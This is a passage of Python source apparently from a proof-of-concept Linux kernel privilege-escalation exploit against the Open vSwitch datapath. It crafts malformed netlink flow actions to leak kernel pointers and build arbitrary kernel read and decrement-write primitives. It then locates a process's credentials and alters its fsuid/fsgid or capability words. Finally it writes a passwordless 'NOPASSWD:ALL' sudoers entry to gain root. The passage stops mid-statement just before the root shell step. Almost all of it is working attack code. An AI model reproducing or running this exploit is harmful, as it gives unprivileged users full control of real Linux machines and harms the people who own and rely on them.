    payload = struct.pack("i", 0)
    payload += nla(OVS_DP_ATTR_NAME, cstr(name))
    payload += nla(OVS_DP_ATTR_UPCALL_PID, struct.pack("I", 0))
    payload += nla(OVS_DP_ATTR_USER_FEATURES, struct.pack("I", 0))
    genl.request(
        family_id,
        OVS_DP_CMD_NEW,
        OVS_DATAPATH_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def flow_key(seq: int) -> bytes:
    src_ip = 0x0A000000 | ((seq & 0xFFFF) + 1)
    return b"".join(
        [
            nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 0)),
            nla(
                OVS_KEY_ATTR_ETHERNET,
                b"\x02\x00\x00\x00\x00\x01" + b"\x02\x00\x00\x00\x00\x02",
            ),
            nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", ETH_P_IP)),
            nla(
                OVS_KEY_ATTR_IPV4,
                struct.pack("!IIBBBB", src_ip, 0x0A0000FE, IPPROTO_TCP, 0, 64, 0),
            ),
            nla(OVS_KEY_ATTR_TCP, struct.pack("!HH", 10000 + (seq % 50000), 443)),
            nla(OVS_KEY_ATTR_TCP_FLAGS, struct.pack("!H", 0)),
        ]
    )


def ct_action(payload: bytes = b"") -> bytes:
    return nla(OVS_ACTION_ATTR_CT, nla(OVS_CT_ATTR_COMMIT, b"") + payload)


def ct_helper_payload() -> bytes:
    return nla(OVS_CT_ATTR_HELPER, b"ftp\x00")


def clone_with_helper_leak(fake_action: bytes) -> bytes:
    labels = bytearray(32)
    labels[20 : 20 + len(fake_action)] = fake_action
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels)) + ct_helper_payload()
    helper_payload = ct_helper_payload()
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action(helper_payload) * (CT_ACTION_COUNT - 1),
    )


def clone_with_fake_set_timeout(tun_dst: int) -> bytes:
    labels = bytearray(32)
    labels[20:24] = struct.pack(NLA_HDR, 0xFFFF, OVS_ACTION_ATTR_SET)
    labels[24:28] = struct.pack(NLA_HDR, 12, OVS_KEY_ATTR_TUNNEL_INFO)
    labels[28:32] = struct.pack("<I", tun_dst & 0xFFFFFFFF)
    timeout = bytearray(32)
    timeout[0:4] = struct.pack("<I", (tun_dst >> 32) & 0xFFFFFFFF)
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels))
    payload += nla(OVS_CT_ATTR_TIMEOUT, bytes(timeout))
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action() * (CT_ACTION_COUNT - 1),
    )


def labels_only_wrap_plan(ct_action_len: int, labels_offset: int) -> tuple[int, int]:
    if ct_action_len < 8 or ct_action_len % 4:
        raise RuntimeError(f"unexpected OVS CT action length {ct_action_len}")
    fake_offset = 16
    target_wrap = 8 + labels_offset + fake_offset
    if target_wrap >= 0x10000 or target_wrap % 4:
        raise RuntimeError(
            f"cannot target labels-only fake SET wrap offset 0x{target_wrap:x}"
        )
    best_score: int | None = None
    best_total = 0
    best_pad = 0
    for total_ct_actions in range(360, 421):
        base_wrap = (4 + total_ct_actions * ct_action_len) & 0xFFFF
        diff = (target_wrap - base_wrap) & 0xFFFF
        pad_count = diff // 4
        true_len = 4 + total_ct_actions * ct_action_len + pad_count * 4
        if true_len <= 0xFFFF or pad_count > 256:
            continue
        score = pad_count + abs(total_ct_actions - 400)
        if best_score is None or score < best_score:
            best_score = score
            best_total = total_ct_actions
            best_pad = pad_count
    if best_score is None:
        raise RuntimeError(
            "could not build labels-only fake SET wrap plan for "
            f"ct_action_len={ct_action_len} labels_offset={labels_offset}"
        )
    return best_total, best_pad


def clone_with_fake_set_tunnel_labels_only(
    tun_dst: int, ct_action_len: int, labels_offset: int
) -> bytes:
    total_ct_actions, pad_count = labels_only_wrap_plan(
        ct_action_len, labels_offset
    )
    fake_offset = 16
    labels = bytearray(32)
    labels[fake_offset : fake_offset + 4] = struct.pack(
        NLA_HDR, 0xFFFF, OVS_ACTION_ATTR_SET
    )
    labels[fake_offset + 4 : fake_offset + 8] = struct.pack(
        NLA_HDR, 12, OVS_KEY_ATTR_TUNNEL_INFO
    )
    labels[fake_offset + 8 : fake_offset + 16] = struct.pack("<Q", tun_dst)
    payload = nla(OVS_CT_ATTR_LABELS, bytes(labels))
    pad = nla(OVS_ACTION_ATTR_POP_VLAN, b"") * pad_count
    return nla(
        OVS_ACTION_ATTR_CLONE,
        ct_action(payload) + ct_action() * (total_ct_actions - 1) + pad,
    )


def clone_with_fake_set_carrier(
    carrier: str, tun_dst: int, offsets: KernelOffsets
) -> bytes:
    if carrier == CARRIER_TIMEOUT:
        return clone_with_fake_set_timeout(tun_dst)
    if carrier == CARRIER_LABELS_ONLY:
        return clone_with_fake_set_tunnel_labels_only(
            tun_dst,
            offsets.ovs_ct_action_len,
            offsets.ovs_ct_labels,
        )
    raise RuntimeError(f"unknown fake SET carrier {carrier!r}")


def fake_set_carrier_error(exc: Exception) -> bool:
    if isinstance(exc, OSError):
        return exc.errno == errno.EINVAL
    return "flow get response did not include actions" in str(exc)


class FakeSetCarriers:
    def __init__(self, mode: str, label: str) -> None:
        if mode not in CARRIER_ORDER and mode != CARRIER_AUTO:
            raise RuntimeError(f"unknown {label} carrier mode {mode!r}")
        self.mode = mode
        self.label = label
        self.timeout_disabled = False

    def names(self) -> tuple[str, ...]:
        if self.mode != CARRIER_AUTO:
            return (self.mode,)
        if self.timeout_disabled:
            return (CARRIER_LABELS_ONLY,)
        return CARRIER_ORDER

    def retry_after(self, carrier: str, has_next: bool) -> bool:
        if self.mode != CARRIER_AUTO or carrier != CARRIER_TIMEOUT or not has_next:
            return False
        print(
            f"fake SET timeout carrier failed for {self.label}; "
            "using labels-only carrier",
            flush=True,
        )
        self.timeout_disabled = True
        return True


def create_flow(
    genl: GenericNetlink,
    family_id: int,
    dp_ifindex: int,
    key: bytes,
    actions: bytes,
) -> None:
    payload = (
        struct.pack("i", dp_ifindex)
        + nla(OVS_FLOW_ATTR_KEY, key)
        + nla(OVS_FLOW_ATTR_ACTIONS, actions)
    )
    genl.request(
        family_id,
        OVS_FLOW_CMD_NEW,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def delete_flow(genl: GenericNetlink, family_id: int, dp_ifindex: int, key: bytes) -> None:
    payload = struct.pack("i", dp_ifindex) + nla(OVS_FLOW_ATTR_KEY, key)
    genl.request(
        family_id,
        OVS_FLOW_CMD_DEL,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK,
    )


def get_flow_actions(
    genl: GenericNetlink, family_id: int, dp_ifindex: int, key: bytes
) -> bytes:
    payload = struct.pack("i", dp_ifindex) + nla(OVS_FLOW_ATTR_KEY, key)
    replies = genl.request(family_id, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION, payload)
    if not replies:
        raise RuntimeError("flow get returned no replies")
    for attr in parse_attrs(replies[0][8:]):
        if attr.attr_type == OVS_FLOW_ATTR_ACTIONS:
            return attr.payload
    raise RuntimeError("flow get response did not include actions")


def likely_kernel_pointers(buf: bytes) -> list[tuple[int, int]]:
    hits: list[tuple[int, int]] = []
    for offset in range(0, max(0, len(buf) - 7)):
        value = struct.unpack_from("<Q", buf, offset)[0]
        if 0xFFFF800000000000 <= value <= 0xFFFFFFFFFFFFFFFF:
            hits.append((offset, value))
    return hits


def find_helper_pointer(actions: bytes) -> int:
    for top in parse_attrs(actions):
        if top.attr_type == OVS_ACTION_ATTR_OUTPUT and top.raw_len == 512:
            hits = likely_kernel_pointers(top.payload)
            helperish = [
                value
                for _off, value in hits
                if 0xFFFFFFFFC0000000 <= value <= 0xFFFFFFFFDFFFFFFF
                and (value & 0x7) == 0
            ]
            if helperish:
                return helperish[0]
            if hits:
                return hits[0][1]
    raise RuntimeError("no helper pointer found in fake OUTPUT leak")


class OvsReadPrimitive:
    def __init__(
        self,
        genl: GenericNetlink,
        flow_family: int,
        dp_ifindex: int,
        offsets: KernelOffsets,
        carrier_mode: str = CARRIER_AUTO,
        preferred_lanes: tuple[str, ...] = (),
    ) -> None:
        self.genl = genl
        self.flow_family = flow_family
        self.dp_ifindex = dp_ifindex
        self.offsets = offsets
        self.carriers = FakeSetCarriers(carrier_mode, "read")
        self.seq = 1000
        self.scalar_lanes = (
            TunnelReadLane(
                "tos",
                offsets.ip_tunnel_key_tos,
                OVS_TUNNEL_KEY_ATTR_TOS,
                0,
                True,
            ),
            TunnelReadLane(
                "ttl",
                offsets.ip_tunnel_key_ttl,
                OVS_TUNNEL_KEY_ATTR_TTL,
                0,
                False,
            ),
            TunnelReadLane(
                "tp_src_0",
                offsets.ip_tunnel_key_tp_src,
                OVS_TUNNEL_KEY_ATTR_TP_SRC,
                0,
                True,
            ),
            TunnelReadLane(
                "tp_src_1",
                offsets.ip_tunnel_key_tp_src + 1,
                OVS_TUNNEL_KEY_ATTR_TP_SRC,
                1,
                True,
            ),
            TunnelReadLane(
                "tp_dst_0",
                offsets.ip_tunnel_key_tp_dst,
                OVS_TUNNEL_KEY_ATTR_TP_DST,
                0,
                True,
            ),
            TunnelReadLane(
                "tp_dst_1",
                offsets.ip_tunnel_key_tp_dst + 1,
                OVS_TUNNEL_KEY_ATTR_TP_DST,
                1,
                True,
            ),
        )
        self.ipv4_lanes = tuple(
            TunnelReadLane(
                f"ipv4_src_{index}",
                offsets.ip_tunnel_key_ipv4_src + index,
                OVS_TUNNEL_KEY_ATTR_IPV4_SRC,
                index,
                True,
            )
            for index in range(4)
        ) + tuple(
            TunnelReadLane(
                f"ipv4_dst_{index}",
                offsets.ip_tunnel_key_ipv4_dst + index,
                OVS_TUNNEL_KEY_ATTR_IPV4_DST,
                index,
                True,
            )
            for index in range(4)
        )
        default_lanes = self.scalar_lanes + self.ipv4_lanes
        preferred_names = set(preferred_lanes)
        preferred = tuple(
            lane
            for name in preferred_lanes
            for lane in default_lanes
            if lane.name == name
        )
        remaining = tuple(lane for lane in default_lanes if lane.name not in preferred_names)
        self.read_lanes = preferred + remaining

    def read_u8_with_lane(self, address: int, lane: TunnelReadLane) -> int | None:
        key_start = address - lane.field_offset
        tun_dst = key_start - self.offsets.metadata_dst_tun_info
        dumped = b""
        carriers = self.carriers.names()
        for index, carrier in enumerate(carriers):
            self.seq += 1
            key = flow_key(self.seq)
            actions = clone_with_fake_set_carrier(carrier, tun_dst, self.offsets)
            try:
                create_flow(self.genl, self.flow_family, self.dp_ifindex, key, actions)
                dumped = get_flow_actions(
                    self.genl, self.flow_family, self.dp_ifindex, key
                )
                break
            except (OSError, RuntimeError) as exc:
                if fake_set_carrier_error(exc):
                    if self.carriers.retry_after(carrier, index + 1 < len(carriers)):
                        continue
                    return None
                raise
        for top in parse_attrs(dumped):
            if top.attr_type != OVS_ACTION_ATTR_SET:
                continue
            for tunnel_key in parse_attrs(top.payload):
                if tunnel_key.attr_type != OVS_KEY_ATTR_TUNNEL:
                    continue
                saw_tunnel = False
                for tunnel_attr in parse_attrs(tunnel_key.payload):
                    if tunnel_attr.attr_type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE:
                        return None
                    saw_tunnel = True
                    if tunnel_attr.attr_type == lane.attr_type:
                        if len(tunnel_attr.payload) <= lane.payload_index:
                            raise RuntimeError(
                                f"unexpected {lane.name} payload length "
                                f"{len(tunnel_attr.payload)}"
                            )
                        return tunnel_attr.payload[lane.payload_index]
                if saw_tunnel and lane.optional_zero:
                    return 0
        return None

    def read_u8(self, address: int) -> int:
        for lane in self.read_lanes:
            value = self.read_u8_with_lane(address, lane)
            if value is not None:
                return value
        raise RuntimeError(
            f"fixed tunnel carriers could not read byte at 0x{address:016x}"
        )

    def read_bytes(self, address: int, size: int) -> bytes:
        return bytes(self.read_u8(address + offset) for offset in range(size))

    def read_u32(self, address: int) -> int:
        return int(struct.unpack("<I", self.read_bytes(address, 4))[0])

    def read_u64(self, address: int) -> int:
        return int(struct.unpack("<Q", self.read_bytes(address, 8))[0])


class OvsWritePrimitive:
    def __init__(
        self,
        genl: GenericNetlink,
        flow_family: int,
        dp_ifindex: int,
        offsets: KernelOffsets,
        carrier_mode: str = CARRIER_AUTO,
    ) -> None:
        self.genl = genl
        self.flow_family = flow_family
        self.dp_ifindex = dp_ifindex
        self.offsets = offsets
        self.carriers = FakeSetCarriers(carrier_mode, "write")
        self.seq = 100000000

    def decrement_u32_once(self, target_address: int) -> None:
        tun_dst = target_address - self.offsets.dst_entry_ref
        carriers = self.carriers.names()
        for index, carrier in enumerate(carriers):
            self.seq += 1
            key = flow_key(self.seq)
            actions = clone_with_fake_set_carrier(carrier, tun_dst, self.offsets)
            try:
                create_flow(self.genl, self.flow_family, self.dp_ifindex, key, actions)
                delete_flow(self.genl, self.flow_family, self.dp_ifindex, key)
                return
            except OSError as exc:
                if exc.errno == errno.ENOMEM:
                    raise RuntimeError(
                        "Ran out of memory; reattempt the PoC after a reboot "
                        "or with more RAM (recommended 2GB+)."
                    ) from exc
                if fake_set_carrier_error(exc):
                    if self.carriers.retry_after(carrier, index + 1 < len(carriers)):
                        continue
                    raise RuntimeError(
                        f"fake SET {carrier} write carrier failed"
                    ) from exc
                raise


def valid_vmlinux_base(value: int) -> bool:
    return (
        0xFFFFFFFF80000000 <= value <= 0xFFFFFFFFF0000000
        and value % 0x200000 == 0
    )


def derive_helper_module_ktype(
    reader: OvsReadPrimitive,
    helper_me_address: int,
    helper_pointer: int,
    offsets: KernelOffsets,
) -> int:
    module_pointer = canonicalize_kernel_pointer(reader.read_u64(helper_me_address))
    if not (
        canonical_kernel_pointer(module_pointer)
        and helper_pointer - 0x800000 <= module_pointer <= helper_pointer + 0x800000
    ):
        raise RuntimeError(
            "helper->me did not read as a nearby canonical module pointer: "
            f"helper=0x{helper_pointer:016x} me=0x{module_pointer:016x}"
        )
    ktype_addr = module_pointer + offsets.module_kobj_ktype
    module_ktype = canonicalize_kernel_pointer(reader.read_u64(ktype_addr))
    if not valid_vmlinux_base(module_ktype - offsets.vmlinux_module_ktype):
        raise RuntimeError(
            f"module.kobj.ktype at 0x{ktype_addr:016x} read "
            f"0x{module_ktype:016x}, which does not match the expected "
            "vmlinux symbol offset"
        )
    log(f"helper->me module pointer 0x{module_pointer:016x} validated directly")
    return module_ktype


def canonicalize_kernel_pointer(value: int) -> int:
    if 0xFFFF800000000000 <= value <= 0xFFFFFFFFFFFFFFFF:
        return value
    if 0x0000008000000000 <= value <= 0x000000FFFFFFFFFF:
        return value | 0xFFFFFF0000000000
    if 0x0000800000000000 <= value <= 0x0000FFFFFFFFFFFF:
        return value | 0xFFFF000000000000
    if 0x0080000000000000 <= value <= 0x00FFFFFFFFFFFFFF:
        return value | 0xFF00000000000000
    return value


def canonical_kernel_pointer(value: int) -> bool:
    canonical = canonicalize_kernel_pointer(value)
    return 0xFF00000000000000 <= canonical <= 0xFFFFFFFFFFFFFFFF and canonical % 8 == 0


def read_kernel_pointer(
    reader: OvsReadPrimitive,
    address: int,
    label: str,
) -> int:
    pointer = canonicalize_kernel_pointer(reader.read_u64(address))
    if not canonical_kernel_pointer(pointer):
        raise RuntimeError(
            f"{label} at 0x{address:016x} is not a canonical kernel pointer: "
            f"0x{pointer:016x}"
        )
    return pointer


def xarray_entry_to_node(entry: int) -> int | None:
    if entry == 0 or (entry & 0x3) != 0x2:
        return None
    node = canonicalize_kernel_pointer(entry & ~0x3)
    if canonical_kernel_pointer(node):
        return node
    return None


def xarray_entry_to_pointer(entry: int) -> int | None:
    if entry == 0 or (entry & 0x3) != 0:
        return None
    pointer = canonicalize_kernel_pointer(entry)
    if canonical_kernel_pointer(pointer):
        return pointer
    return None


def read_xarray_entry(
    reader: OvsReadPrimitive,
    address: int,
    label: str,
) -> int:
    value = reader.read_u64(address)
    node = xarray_entry_to_node(value)
    if node is not None:
        return node | 0x2
    pointer = xarray_entry_to_pointer(value)
    if pointer is not None:
        return pointer
    raise RuntimeError(
        f"{label} at 0x{address:016x} is not a valid XArray entry: "
        f"0x{value:016x}"
    )


def read_xa_shift(reader: OvsReadPrimitive, address: int) -> int:
    value = reader.read_u8(address)
    if value > 60 or value % 6 != 0:
        raise RuntimeError(
            f"XArray node shift at 0x{address:016x} is invalid: {value}"
        )
    return value


def lookup_init_pid_ns_pid(
    reader: OvsReadPrimitive,
    offsets: KernelOffsets,
    kernel_base: int,
    pid_nr: int,
) -> int:
    idr_addr = kernel_base + offsets.vmlinux_init_pid_ns + offsets.pid_namespace_idr
    idr_base = reader.read_u32(idr_addr + offsets.idr_base)
    if pid_nr < idr_base:
        raise RuntimeError(f"pid {pid_nr} is below init pid namespace idr_base {idr_base}")
    index = pid_nr - idr_base
    xarray_addr = idr_addr + offsets.idr_idr_rt

    entry = read_xarray_entry(
        reader,
        xarray_addr + offsets.xarray_xa_head,
        "init_pid_ns.idr.xa_head",
    )
    for depth in range(8):
        node = xarray_entry_to_node(entry)
        if node is not None:
            shift = read_xa_shift(reader, node + offsets.xa_node_shift)
            slot = (index >> shift) & 0x3F
            entry = read_xarray_entry(
                reader,
                node + offsets.xa_node_slots + slot * 8,
                f"init_pid_ns.idr.slot[{slot}]",
            )
            continue
        pointer = xarray_entry_to_pointer(entry)
        if pointer is not None:
            return pointer
    raise RuntimeError(f"init_pid_ns idr traversal exceeded depth limit for pid {pid_nr}")


def locate_task_by_init_pid_ns(
    reader: OvsReadPrimitive,
    offsets: KernelOffsets,
    kernel_base: int,
    wanted_pid: int,
) -> int:
    pid_struct = lookup_init_pid_ns_pid(reader, offsets, kernel_base, wanted_pid)
    first = read_kernel_pointer(
        reader,
        pid_struct + offsets.pid_tasks + offsets.hlist_head_first,
        "pid.tasks.first",
    )
    task = first - offsets.task_pid_links
    if not canonical_kernel_pointer(task):
        raise RuntimeError(
            f"init_pid_ns idr produced noncanonical task from hlist: "
            f"pid_struct=0x{pid_struct:016x} hlist=0x{first:016x}"
        )
    pid = reader.read_u32(task + offsets.task_pid)
    if pid != wanted_pid:
        raise RuntimeError(
            f"init_pid_ns idr resolved pid_struct=0x{pid_struct:016x} "
            f"task=0x{task:016x}, but task.pid={pid}, expected {wanted_pid}"
        )
    print(
        f"located task through init_pid_ns idr: "
        f"pid_struct=0x{pid_struct:016x} task=0x{task:016x}",
        flush=True,
    )
    return task


def decrement_to_zero(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    address: int,
    label: str,
) -> None:
    value = reader.read_u32(address)
    print(f"{label} before={value}", flush=True)
    if value > 100000:
        raise RuntimeError(f"{label} value {value} is unexpectedly large")
    for idx in range(value):
        writer.decrement_u32_once(address)
        if idx and idx % 250 == 0:
            print(f"{label}: queued {idx}/{value} decrements", flush=True)
    time.sleep(2.0)
    now = reader.read_u32(address)
    if now != 0:
        raise RuntimeError(f"{label} did not reach zero; current value is {now}")
    print(f"{label} after=0", flush=True)


def decrement_zero_to_all_ones(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    address: int,
    label: str,
) -> None:
    value = reader.read_u32(address)
    print(f"{label} before=0x{value:08x}", flush=True)
    if value != 0:
        raise RuntimeError(
            f"{label} expected to start at zero for legacy __refcnt conversion, "
            f"got 0x{value:08x}"
        )
    writer.decrement_u32_once(address)
    time.sleep(0.5)
    now = reader.read_u32(address)
    if now != 0xFFFFFFFF:
        raise RuntimeError(
            f"{label} did not wrap to 0xffffffff; current value is 0x{now:08x}"
        )
    print(f"{label} after=0xffffffff", flush=True)


def panic_on_warn_enabled() -> bool:
    try:
        with open("/proc/sys/kernel/panic_on_warn", "r", encoding="ascii") as handle:
            return handle.read().strip() not in ("", "0")
    except OSError:
        return False


def convert_writer_credential(
    reader: OvsReadPrimitive,
    writer: OvsWritePrimitive,
    offsets: KernelOffsets,
    cred: int,
) -> None:
    if offsets.dst_entry_ref_kind == "__rcuref":
        step("DECREMENTING FSUID/FSGID")
        decrement_to_zero(reader, writer, cred + offsets.cred_fsuid, "fsuid")
        decrement_to_zero(reader, writer, cred + offsets.cred_fsgid, "fsgid")
        return
    if offsets.dst_entry_ref_kind == "__refcnt":
        if panic_on_warn_enabled():
            raise RuntimeError(
                "legacy dst_entry.__refcnt conversion would trigger a kernel "
                "WARN while wrapping capability words, and panic_on_warn is enabled"
            )
        print(
            "legacy dst_entry.__refcnt conversion: panic_on_warn is disabled; "
            "wrapping capability words may emit one nonfatal dst_release warning",
            flush=True,
        )
        step("WRAPPING HOST WRITER CAPABILITIES")
        decrement_zero_to_all_ones(
            reader,
            writer,
            cred + offsets.cred_cap_permitted,
            "cap_permitted.low",
        )
        decrement_zero_to_all_ones(
            reader,
            writer,
            cred + offsets.cred_cap_effective,
            "cap_effective.low",
        )
        return
    raise RuntimeError(f"unsupported dst_entry ref kind {offsets.dst_entry_ref_kind}")


def try_write_root_proof(path: str, text: str) -> bool:
    try:
        with open(path, "w", encoding="ascii") as handle:
            handle.write(text)
        os.sync()
        return True
    except OSError as exc:
        print(f"write {path} failed: errno={exc.errno} {exc.strerror}", flush=True)
        return False


def sudoers_references_dropin_dir(
    sudoers_path: str = SUDOERS_FILE,
    dropin_dir: str = SUDOERS_DROPIN_DIR,
) -> bool:
    try:
        with open(sudoers_path, "r", encoding="ascii", errors="replace") as handle:
            for raw_line in handle:
                line = raw_line.strip()
                if not line:
                    continue
                if line.startswith("#includedir") or line.startswith("@includedir"):
                    fields = line.split()
                    if len(fields) >= 2 and fields[1].strip("\"'") == dropin_dir:
                        return True
    except OSError as exc:
        print(
            f"could not inspect {sudoers_path}: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
    return False


def write_sudoers_dropin(path: str, username: str) -> bool:
    content = f"{username} ALL=(ALL) NOPASSWD:ALL\n".encode("ascii")
    old_umask = os.umask(0)
    try:
        os.makedirs(os.path.dirname(path), mode=0o755, exist_ok=True)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, content)
            os.fchmod(fd, 0o440)
            os.fsync(fd)
        finally:
            os.close(fd)
        os.sync()
        return True
    except OSError as exc:
        print(
            f"sudoers drop-in write {path} failed: errno={exc.errno} "
            f"{exc.strerror}",
            flush=True,
        )
        return False
    finally:
        os.umask(old_umask)


def append_main_sudoers(username: str, path: str = SUDOERS_FILE) -> bool:
    content = f"\n{username} ALL=(ALL:ALL) NOPASSWD:ALL\n".encode("ascii")
    try:
        fd = os.open(path, os.O_WRONLY | os.O_APPEND)
        try:
            os.write(fd, content)
            os.fsync(fd)
        finally:
            os.close(fd)
        os.sync()
        return True
    except OSError as exc:
        print(
            f"sudoers append {path} failed: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
        return False


def replace_main_sudoers(username: str, path: str = SUDOERS_FILE) -> bool:
    content = f"\n{username} ALL=(ALL:ALL) NOPASSWD:ALL\n".encode("ascii")
    directory = os.path.dirname(path)
    tmp_path = os.path.join(directory, f".ovs_c004_sudoers_{os.getpid()}")
    try:
        with open(path, "rb") as handle:
            existing = handle.read()
        try:
            os.unlink(tmp_path)
        except FileNotFoundError:
            pass
        fd = os.open(tmp_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        try:
            os.write(fd, existing)
            os.write(fd, content)
            os.fchmod(fd, 0o440)
            os.fsync(fd)
        finally:
            os.close(fd)
        os.rename(tmp_path, path)
        dir_fd = os.open(directory, os.O_RDONLY | os.O_DIRECTORY)
        try:
            os.fsync(dir_fd)
        finally:
            os.close(dir_fd)
        os.sync()
        return True
    except OSError as exc:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        print(
            f"sudoers replace {path} failed: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
        return False


def write_sudoers_entry(path: str, username: str) -> tuple[bool, str]:
    if sudoers_references_dropin_dir():
        if write_sudoers_dropin(path, username):
            return True, path
        print(f"falling back to direct append of {SUDOERS_FILE}", flush=True)
    else:
        print(
            f"{SUDOERS_FILE} does not reference {SUDOERS_DROPIN_DIR}; "
            "using direct sudoers append",
            flush=True,
        )
    if append_main_sudoers(username):
        return True, SUDOERS_FILE
    print(f"falling back to atomic replacement of {SUDOERS_FILE}", flush=True)
    if replace_main_sudoers(username):
        return True, SUDOERS_FILE
    return False, ""


def try_become_root_ids() -> None:
    try:
        os.setresgid(0, 0, 0)
        os.setresuid(0, 0, 0)
    except OSError:
        pass


def sleep_forever_detached() -> None:
    os.setsid()
    devnull = os.open("/dev/null", os.O_RDWR)
    os.dup2(devnull, 0)
    os.dup2(devnull, 1)
    os.dup2(devnull, 2)
    if devnull > 2:
        os.close(devnull)
    while True:
        time.sleep(3600)


def fork_sudoers_writer(path: str, username: str) -> tuple[int, int, int]:
    trigger_read, trigger_write = os.pipe()
    ack_read, ack_write = os.pipe()
    child = os.fork()
    if child == 0:
        os.close(trigger_write)
        os.close(ack_read)
        ok = False
        used_path = ""
        try:
            token = os.read(trigger_read, 1)
            if token == b"1":
                try_become_root_ids()
                ok, used_path = write_sudoers_entry(path, username)
            ack = f"1 {used_path}\n".encode("ascii") if ok else b"0\n"
            os.write(ack_write, ack)
        except Exception:
            try:
                os.write(ack_write, b"0\n")
            except OSError:
                pass
        finally:
            for fd in (trigger_read, ack_write):
                try:
                    os.close(fd)
                except OSError:
                    pass
        if ok:
            sleep_forever_detached()
        os._exit(0)
    os.close(trigger_read)
    os.close(ack_write)
    print(f"host sudoers writer child pid={child}", flush=True)
    return child, trigger_write, ack_read


def fork_namespace_pin() -> None:
    child = os.fork()
    if child == 0:
        sleep_forever_detached()
    print(f"namespace pin child pid={child}", flush=True)


def trigger_sudoers_writer(trigger_fd: int, ack_fd: int) -> str:
    result = b""
    try:
        os.write(trigger_fd, b"1")
        while True:
            chunk = os.read(ack_fd, 4096)
            if not chunk:
                break
            result += chunk
    finally:
        for fd in (trigger_fd, ack_fd):
            try:
                os.close(fd)
            except OSError:
                pass
    if not result.startswith(b"1 "):
        raise RuntimeError("sudoers writer child failed")
    return result[2:].decode("ascii", errors="replace").strip()


def main() -> None:
    if len(sys.argv) > 1 and sys.argv[1] == "--child":
        host_user = validate_child_namespace()
        exploit_from_private_namespace(host_user)
        return
    if len(sys.argv) > 1:
        raise RuntimeError("usage: python3 ovswrap-poc.py")

    step("CHECKING LAUNCHING USER")
    host_uid, host_gid, host_user = launching_user()
    print(
        f"launching user: name={host_user} uid={host_uid} gid={host_gid}",
        flush=True,
    )
    ensure_user_starts_without_passwordless_sudo(host_user)
    sudoers_path = f"/etc/sudoers.d/ovs_c004_{os.getpid()}"
    writer_pid, writer_trigger_fd, writer_ack_fd = fork_sudoers_writer(
        sudoers_path, host_user
    )
    run_child_in_private_namespace(
        host_user,
        writer_pid,
        writer_trigger_fd,
        writer_ack_fd,
    )


def exploit_from_private_namespace(host_user: str) -> None:
    step("BEGINNING SETUP")
    print(f"host user for sudoers entry: {host_user}", flush=True)
    print(f"namespace uid/gid: uid={os.getuid()} gid={os.getgid()}", flush=True)
    print(f"process identity: {run_text(['id'])}", flush=True)
    print(f"effective capability mask: {process_status_line('CapEff:')}", flush=True)
    print(f"uid_map: {uid_map_first_entry()[3]}", flush=True)

    genl = GenericNetlink()
    dp_family = genl.get_family("ovs_datapath")
    flow_family = genl.get_family("ovs_flow")
    dp_name = f"vhrd{os.getpid() % 10000}"
    create_datapath(genl, dp_family, dp_name)
    dp_ifindex = socket.if_nametoindex(dp_name)
    print(f"datapath {dp_name} ifindex {dp_ifindex}", flush=True)

    step("DERIVING KERNEL OFFSETS")
    offsets, kernel_record = current_kernel_parameters()
    writer_pid, writer_trigger_fd, writer_ack_fd = inherited_sudoers_writer()
    fork_namespace_pin()

    step("BUILDING OVS ACTION PRIMITIVES")
    fake_copy = struct.pack(NLA_HDR, 512, OVS_ACTION_ATTR_OUTPUT)
    helper_leak_key = flow_key(1)
    create_flow(
        genl,
        flow_family,
        dp_ifindex,
        helper_leak_key,
        clone_with_helper_leak(fake_copy),
    )
    helper_leak_actions = get_flow_actions(genl, flow_family, dp_ifindex, helper_leak_key)
    helper_pointer = find_helper_pointer(helper_leak_actions)
    print(f"leaked helper-ish pointer 0x{helper_pointer:016x}", flush=True)

    read_carrier = (
        kernel_record.read_carrier if kernel_record is not None else CARRIER_AUTO
    )
    write_carrier = (
        kernel_record.write_carrier if kernel_record is not None else CARRIER_AUTO
    )
    read_lanes = kernel_record.read_lanes if kernel_record is not None else ()
    reader = OvsReadPrimitive(
        genl,
        flow_family,
        dp_ifindex,
        offsets,
        read_carrier,
        read_lanes,
    )
    writer = OvsWritePrimitive(genl, flow_family, dp_ifindex, offsets, write_carrier)

    module_ktype = derive_helper_module_ktype(
        reader,
        helper_pointer + offsets.nf_conntrack_helper_me,
        helper_pointer,
        offsets,
    )
    kernel_base = module_ktype - offsets.vmlinux_module_ktype
    print(f"module_ktype=0x{module_ktype:016x} kernel_base=0x{kernel_base:016x}", flush=True)

    step("CHECKING BASELINE WRITE")
    protected_path = f"/root/ovs_c004_lpe_proof_{os.getpid()}"
    if try_write_root_proof(protected_path, "pre-exploit should not write\n"):
        raise RuntimeError("unexpectedly wrote root proof path before exploit")

    step("LOCATING WRITER CREDENTIAL")
    task = locate_task_by_init_pid_ns(reader, offsets, kernel_base, writer_pid)
    cred = read_kernel_pointer(reader, task + offsets.task_cred, "task->cred")
    print(
        f"writer task=0x{task:016x} pid={writer_pid} cred=0x{cred:016x}",
        flush=True,
    )

    convert_writer_credential(reader, writer, offsets, cred)

    step("WRITING SUDOERS ENTRY")
    used_sudoers_path = trigger_sudoers_writer(writer_trigger_fd, writer_ack_fd)
    print(
        f"sudoers write succeeded: {used_sudoers_path} user={host_user}",
        flush=True,
    )
    print(
        "sudoers policy write achieved; returning to launcher for root shell",
